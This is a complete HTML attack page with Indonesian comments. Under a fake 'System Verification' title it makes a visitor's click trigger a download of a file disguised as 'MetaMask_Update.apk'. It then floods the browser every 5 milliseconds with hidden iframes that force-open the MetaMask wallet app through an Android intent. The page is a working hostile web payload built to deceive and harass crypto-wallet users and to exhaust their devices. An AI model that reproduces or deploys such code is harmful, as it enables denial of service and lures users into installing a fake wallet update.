<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000; color: #f00; font-family: monospace;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
  }
  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
  h2 { animation: blink 0.1s infinite; }
  @keyframes blink { 50% { opacity: 0.1; } }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 100px; overflow-y: auto; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>☢️ SYSTEM HACKED ☢️</h2>
  <p>Klik di mana saja untuk memulai.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. KONFIGURASI INTENT
  // ============================================
  var METAMASK_INTENT = "intent://#Intent;" +
                        "package=io.metamask;" +
                        "scheme=metamask;" +
                        "end;";

  // ============================================
  // 2. TRIGGER INFINITE FLOOD (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>EXECUTING INFINITE FLOOD...</h2>
      <p>Membanjiri Intent MetaMask...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Infinite Intent Flood (5ms)...");

    // A. Kamuflase: Unduh APK (Sekali saja)
    try {
      var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
      var binary = atob(b64Apk);
      var bytes = new Uint8Array(binary.length);
      for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
      var blob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
      var url = URL.createObjectURL(blob);
      var a = document.createElement('a');
      a.href = url;
      a.download = 'MetaMask_Update.apk';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      log("[+] APK Download Triggered.");
    } catch(e) {}

    // B. INFINITE FLOODING (Setiap 5ms)
    var iframeCount = 0;
    var floodInterval = setInterval(function() {
      try {
        var iframe = document.createElement("iframe");
        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
        iframe.style.display = "none";
        
        iframe.srcdoc = `
          <!DOCTYPE html>
          <html>
          <body>
            <script>
              window.top.location.href = "${METAMASK_INTENT}";
            <\/script>
          </body>
          </html>
        `;
        
        document.getElementById("launcher-container").appendChild(iframe);
        iframeCount++;
        
        if (iframeCount % 10 === 0) {
          log("[+] Iframe " + iframeCount + " terkirim.");
        }

        // Cleanup iframe lama untuk mencegah memori penuh (OOM)
        if (document.getElementById("launcher-container").children.length > 50) {
          document.getElementById("launcher-container").removeChild(
            document.getElementById("launcher-container").firstChild
          );
        }

      } catch(e) {}
    }, 5); // 5ms (Sangat Cepat)

  }, { once: true });

})();
</script>
</body>
</html>
